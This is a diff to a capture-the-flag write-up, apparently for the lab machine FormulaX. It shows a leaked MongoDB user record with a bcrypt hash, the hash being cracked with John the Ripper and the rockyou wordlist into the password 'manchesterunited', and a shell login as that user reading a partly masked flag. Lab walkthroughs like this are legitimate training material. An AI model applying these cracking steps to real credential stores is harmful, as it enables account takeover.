@@ -136,6 +136,42 @@ db.users.find()
 { "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
 ``` 
 
-The frank_dorky's password is encode, this is `bcrypt`. John or hashcat to decode it.
+The frank_dorky's password is encode, this is `bcrypt`. JohnTheRipper or hashcat to decode it.
 ![img4](./img/img4.png) 
 
+```shell
+┌──(toan㉿kali)-[~]
+└─$ nano hash  
+                                                                             
+┌──(toan㉿kali)-[~]
+└─$ cat hash
+$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
+┌──(toan㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchesterunited (?)     
+1g 0:00:00:14 DONE (2024-03-12 09:29) 0.06934g/s 194.7p/s 194.7c/s 194.7C/s catcat..keyboard
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                    
+```
+`manchesterunited`
+
+```shell
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Mar  5 10:19:47 2024 from 10.10.14.23
+frank_dorky@formulax:~$ ls
+user.txt                                      
+frank_dorky@formulax:~$ cat user.txt          
+c734e98<************>47e0a07              
+frank_dorky@formulax:~$                                                      
+                                                                             
+                                                                             
+                                                                
+```
